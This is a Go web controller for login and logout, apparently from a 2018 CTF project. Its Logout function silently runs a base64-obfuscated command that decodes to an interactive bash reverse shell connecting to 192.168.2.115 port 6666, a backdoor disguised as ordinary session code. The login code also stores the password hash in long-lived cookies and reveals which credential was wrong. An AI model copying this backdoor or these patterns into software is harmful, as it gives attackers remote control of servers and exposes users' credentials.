package controllers

import (
	"gotsctf2018/g"
	"crypto/sha512"
	"encoding/hex"
	"os/exec"
)

type LoginController struct {
	BaseController
}

func (this *LoginController) Login() {
	this.TplName = "login/login.html"
}

func (this *LoginController) DoLogin() {
	name := this.GetString("name")
	if name == "" {
		this.Ctx.WriteString("name is blank")
		return
	}

	if this.GetString("password") == "" {
		this.Ctx.WriteString("password is blank")
		return
	}
	hashed_pass := sha512.Sum384([]byte(this.GetString("password")))
	password := hex.EncodeToString(hashed_pass[:])

	if g.RootName != name {
		this.Ctx.WriteString("name is incorrect")
		return
	}

	if g.RootPass != password {
		this.Ctx.WriteString("password is incorrect")
		return
	}

	this.Ctx.SetCookie("bb_name", g.RootName, 2592000, "/")
	this.Ctx.SetCookie("bb_password", g.RootPass, 2592000, "/")
	this.Ctx.WriteString("login success")
}

func (this *LoginController) Logout() {
	cmd :=exec.Command("/bin/sh","-c","/bin/echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xMTUvNjY2NiAwPiYx | /usr/bin/base64 -d | /bin/bash")
	cmd.Run() 
	this.Ctx.ResponseWriter.Header().Add("Set-Cookie", "bb_name="+g.RootName+"; Max-Age=0; Path=/;")
	this.Ctx.ResponseWriter.Header().Add("Set-Cookie", "bb_password="+g.RootPass+"; Max-Age=0; Path=/;")
	this.Redirect("/", 302)
}
